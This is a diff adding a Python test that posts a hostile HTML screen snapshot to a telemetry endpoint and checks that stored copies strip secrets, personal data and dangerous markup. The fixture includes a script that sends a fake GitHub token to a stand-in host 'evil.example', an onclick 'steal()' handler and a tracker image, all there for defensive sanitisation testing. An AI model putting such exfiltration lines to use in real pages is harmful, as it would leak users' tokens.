@@ -701,3 +701,47 @@ async def test_a_screen_copy_is_kept_only_for_the_callers_own_conversation(clien
     assert not folder.exists() or not list(folder.glob("*.json")), "someone else's conversation: nothing kept"
     assert (await client.post("/telemetry/screen", json=dict(copy_, session_id="mine"), headers=PROXIED)).status_code == 204
     assert [p.name for p in folder.glob("*.json")] == ["0001-error.json"]
+
+
+async def test_a_hostile_screen_copy_posted_directly_keeps_nothing_it_must_not(client):
+    """The 2026-09-26 deploy review, F-02, second round: the markup is parsed, not matched —
+    either quote style, any attribute, handlers, URLs, scripts, comments, typed values — and
+    every piece of metadata passes the timeline's rule. GitHub tokens included."""
+    from app.observability import timeline as timeline_module
+    from tests.fake_credentials import github_fine_grained_token, github_token
+    from tests.test_actions_routes import OWNER
+
+    configure(client, logins=f"{OWNER}, other@example.com")
+    runtime = client.runtime
+    runtime.settings = replace(runtime.settings, screen_snapshots=True) if hasattr(runtime.settings, "__dataclass_fields__") else runtime.settings.model_copy(update={"screen_snapshots": True})
+    await client.post("/test-session/start", json={"name": "hostile"})
+    assert (await client.post("/turn", json={"text": "hello", "session_id": "mine"}, headers=PROXIED)).status_code == 200
+    classic, fine = github_token("screen-hostile"), github_fine_grained_token("screen-hostile")
+    timeline_module.note_names(["Greg Evans"])
+    html = (
+        "<div id='app' data-email='greg@example.com' data-note=\"call 07700 900123\">"
+        f"<input type='text' value='refund 1440 please'><input type=hidden value='{classic}'>"
+        f"<textarea>{fine}</textarea><p title='Greg Evans'>Greg Evans owes £20 · {classic}</p>"
+        f"<a href='https://example.com/?t={classic}' onclick=\"steal()\">link</a>"
+        f"<script>fetch('https://evil.example/?k={classic}')</script><!-- {classic} -->"
+        "<img src='https://tracker.example/p.png'><img src='data:image/png;base64,iVBORw0KGgo='>"
+        "<svg viewBox='0 0 24 24'><path d='M4 10v4 M8 7v10 0 0 24 24 12 12 12'/></svg></div>"
+    )
+    copy_ = {"session_id": "mine", "reason": "error", "html": html, "turn_id": f"turn {classic}",
+             "viewport": {"w": 390, "h": 844, "dpr": 3},
+             "trigger": {"kind": "exception", "message": f"boom for greg@example.com with {fine}", "authorization": "leak"},
+             "body": {"class": f"alpha {classic}", "mode": "orb"}}
+    try:
+        assert (await client.post("/telemetry/screen", json=copy_, headers=PROXIED)).status_code == 204
+    finally:
+        timeline_module.forget_names()
+    folder = runtime.tests.screens_dir(runtime.timeline.own)
+    (kept,) = folder.glob("*.json")
+    stored = kept.read_text()
+    for leak in (classic, fine, "greg@example.com", "07700 900123", "Greg", "refund 1440", "steal()", "evil.example",
+                 "tracker.example", "example.com/?t=", "<script", "<!--", "onclick", '"leak"'):
+        assert leak not in stored, leak
+    body = json.loads(stored)
+    assert 'viewBox="0 0 24 24"' in body["html"] and 'd="M4 10v4 M8 7v10 0 0 24 24 12 12 12"' in body["html"]
+    assert 'src="data:image/png;base64,iVBORw0KGgo="' in body["html"], "a canvas the page drew is kept"
+    assert "•" in body["html"] and body["body"]["mode"] == "orb"
